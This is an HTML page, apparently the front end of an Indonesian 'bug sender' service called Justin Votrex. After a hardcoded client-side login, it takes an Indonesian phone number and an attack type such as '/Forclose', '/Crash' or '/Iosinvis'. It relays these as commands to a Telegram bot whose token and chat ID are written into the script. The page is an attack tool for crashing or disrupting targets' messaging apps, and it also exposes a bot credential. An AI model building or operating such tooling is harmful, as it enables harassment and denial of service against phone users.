<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>JUSTIN VOTREX</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #0d0d0d, #1a0000);
      color: white;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      align-items: center;
      justify-content: center;
    }

    .card {
      background-color: #111;
      border: 1px solid #ff0000;
      padding: 30px 20px;
      border-radius: 15px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
      transition: 0.3s;
      animation: fadeIn 0.8s ease;
    }

    h1 {
      text-align: center;
      margin-bottom: 25px;
      color: #ff3333;
      font-size: 26px;
      font-weight: bold;
      letter-spacing: 1px;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ff3333;
      border-radius: 8px;
      background-color: #000;
      color: white;
      font-size: 16px;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      background-color: #ff3333;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.2s;
    }

    button:hover {
      background-color: #cc0000;
    }

    .top-bar {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      padding: 15px 25px;
      background-color: #ff1a1a;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-weight: bold;
      font-size: 18px;
      color: white;
    }

    .top-bar .close {
      cursor: pointer;
      font-size: 22px;
    }

    #bug-section {
      display: none;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

  <div class="top-bar">
    <div>JUSTIN VOTREX</div>
    <div class="close" onclick="goBackToLogin()">âœ–</div>
  </div>

  <!-- Login -->
  <div class="card" id="login-section">
    <h1>Login Justin Votrex</h1>
    <input type="text" id="username" placeholder="Masukkan Username" />
    <input type="password" id="key" placeholder="Masukkan Key Akses" />
    <button onclick="login()">LOGIN</button>
  </div>

  <!-- Bug Sender -->
  <div class="card" id="bug-section">
    <h1>Kirim Bug</h1>
    <input type="text" id="target" placeholder="Nomor Target 62XXX" maxlength="15"/>
    <select id="bugType">
      <option value="/Forclose">/Forclose</option>
      <option value="/Crash">/Crash</option>
      <option value="/Invisdelay">/Invisdelay</option>
      <option value="/Combo">/Combo</option>
      <option value="/Fcinvis">/Fcinvis</option>
      <option value="/Justingc">/Justingc</option>
      <option value="/Iosinvis">/Iosinvis</option>
    </select>
    <button onclick="sendBug()">SEND BUG</button>
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = '7342366559:AAFIpd4Y5mwz5oi6c6sOEkxagnzbuvVPfFI';
    const TELEGRAM_CHAT_ID = '-1002871908326';

    function login() {
      const username = document.getElementById("username").value.trim();
      const key = document.getElementById("key").value.trim();

      if (username === "JUSTIN" && key === "V20") {
        alert("Login berhasil!");
        document.getElementById("login-section").style.display = "none";
        document.getElementById("bug-section").style.display = "block";
      } else {
        alert("Username atau Key salah!");
      }
    }

    function goBackToLogin() {
      document.getElementById("bug-section").style.display = "none";
      document.getElementById("login-section").style.display = "block";
    }

    function sendBug() {
      const nomor = document.getElementById("target").value.trim();
      const bug = document.getElementById("bugType").value;

      if (nomor === "" || !nomor.startsWith("62")) {
        alert("Masukkan nomor dengan format 62XXX!");
        return;
      }

      const pesan = `${bug} ${nomor}`; // contoh: /forclose 62831xxx

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: pesan
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert("Bug berhasil dikirim ke Telegram!");
        } else {
          alert("Gagal mengirim ke Telegram.");
        }
      })
      .catch(error => {
        alert("Terjadi kesalahan: " + error);
      });
    }
  </script>

</body>
  </html>
